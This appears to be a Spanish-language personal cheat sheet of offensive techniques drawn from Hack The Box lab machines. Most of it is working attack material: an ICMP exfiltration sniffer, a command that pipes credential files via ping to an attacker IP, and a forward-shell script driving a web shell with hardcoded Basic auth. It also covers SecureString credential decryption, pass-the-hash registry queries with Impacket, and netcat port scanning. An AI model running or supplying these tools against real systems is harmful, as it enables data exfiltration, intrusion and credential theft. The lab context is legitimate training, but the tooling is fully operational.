# extra

# EXTRA

## Exfiltración de datos por ICMP

### Sniffer

```python
#!/usr/bin/python3from scapy.all import *import sys, signaldef def_handler(sig, frame):    sys.exit(1)# Ctrl+Csignal.signal(signal.SIGINT, def_handler)# Variables globalesinterface = 'tun0'def data_parser(packet):    if packet.haslayer(ICMP):        if packet[ICMP].type == 8:            data = packet[ICMP].load[-4:].decode("utf-8")            print(data, flush=True, end='')if __name__ == '__main__': # xxd -p -c 4 /etc/hosts | while read i; do echo $i | xxd -ps -r; done    sniff(iface=interface, prn=data_parser)
```

### Comando a ejecutar

```
command=xxd -p -c 4 /home/loki/cred* | while read i; do ping -c 1 -p $i 10.10.16.2; done
```

## Obtención ACLs

```
loki@Mischief:~$ getfacl /bin/su
getfacl: Removing leading '/' from absolute path names
# file: bin/su
# owner: root
# group: root
# flags: s--
user::rwx
user:loki:r--
group::r-x
mask::r-x
other::r-x
```

## Compartir recurso SAMBA

```
service smbd start
```

```
net usershare add shared $(pwd) '' 'Everyone:F' 'guest_ok=y'
```

## Uso de authbind

En caso de no disponer el privilegio para abrir ciertos puertos, se puede utilizar este comando si hay una regla establecida

```
atanas@kotarak-dmz:/etc/authbind/byport$ authbind python3 -m http.server 80
```

## Forward Shell Python

```python
from base64 import b64encodefrom random import randrangeimport requests, sys, pdb, signaldef def_handler(sig, frame):    print("\n")    sys.exit(1)# Ctrl+Csignal.signal(signal.SIGINT, def_handler)# Variables globalesmain_url = "http://10.10.10.67/webdav_test_inception/cmd.php?cmd="session = randrange(1, 9999)stdin = "/dev/shm/strin.%s" % sessionstdout = "/dev/shm/stdout.%s" % sessiondef RunCmd(command):    headers = {        'Authorization': 'Basic d2ViZGF2X3Rlc3RlcjpiYWJ5Z3VybDY5'    }    command = b64encode(command.encode()).decode()    post_data = {        'cmd': 'echo %s | base64 -d | bash' % command    }    r = requests.post(main_url, data=post_data, headers=headers, timeout=2)    return r.textdef WriteCmd(command):    headers = {        'Authorization': 'Basic d2ViZGF2X3Rlc3RlcjpiYWJ5Z3VybDY5'    }    command = b64encode(command.encode()).decode()    post_data = {        'cmd': 'echo %s | base64 -d > %s' % (command, stdin)    }    r = requests.post(main_url, data=post_data, headers=headers, timeout=2)    return r.textdef ReadCmd(command):    ReadOutput = """/bin/cat %s""" % stdout    response = RunCmd(ReadOutput)    return responsedef SetupShell():    NamedPipes = """mkfifo %s; tail -f %s | /bin/sh 2>&1 > %s""" % (stdin, stdin, stdout)    try:        RunCmd(NamedPipes)    except:        None    return NoneSetupShell()if __name__ == '__main__':    while True:        command = input("> ")        WriteCmd(command + "\n")        response = ReadCmd(command)        print(response)        ClearOutput = """echo '' > %s """ % stdout        RunCmd(ClearOutput)
```

## Solución Java 11 / 16 Error incompatibilidad

```
update-alternatives --config java
```

## Captura de pantalla Windows

```
PS C:\Windows\System32\spool\drivers\color> .\nircmd.exe savescreenshot captura.png
```

## Convertir SecureString a texto plano

```
C:\Users\nico\Desktop>powershell -c "$cred = Import-CliXml -Path cred.xml; $cred.getNetworkCredential() | Format-List *"
powershell -c "$cred = Import-CliXml -Path cred.xml; $cred.getNetworkCredential() | Format-List *"

UserName       : Tom
Password       : 1ts-mag1c!!!
SecurePassword : System.Security.SecureString
Domain         : HTB
```

## Conversión archivo a base64 Windows

```
PS C:\Users\k.svensson\AppData\Roaming\stickynotes\Local Storage\leveldb> [convert]::ToBase64String((Get-Content -path "000003.log" -Encoding byte))
```

## Enumeración de registros

```
reg.py htb.local/henry.vinson@APT -hashes :e53d87d42adaa3ca32bdb34a876cbffb query -keyName HKU
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[!] Cannot check RemoteRegistry status. Hoping it is started...
HKU
HKU\Console
HKU\Control Panel
HKU\Environment
HKU\Keyboard Layout
HKU\Network
HKU\Software
HKU\System
HKU\Volatile Environment
```

## Listar ACLs a través de montura CIFS

```
smbcacls "//10.10.10.103/Department Shares" Users
```

## Simple Formulario HTML para subida de archivos

```
<form action="test.php" method="post" enctype="multipart/form-data" target="_blank">
  <p>
    <input type="file" name="upload">
    <input type="submit" value="upload">
  </p>
</form>
```

## Port Discovery

## Con netcat

```
for port in $(seq 1 65535); do nc 172.17.0.1 $port -zv; done
```

## **XML to HTML Nmap Template**

```jsx
nmap --stylesheet=https://raw.githubusercontent.com/honze-net/nmap-bootstrap-xsl/stable/nmap-bootstrap.xsl -oX targetedXML
xsltproc targeted.xml > index.html
```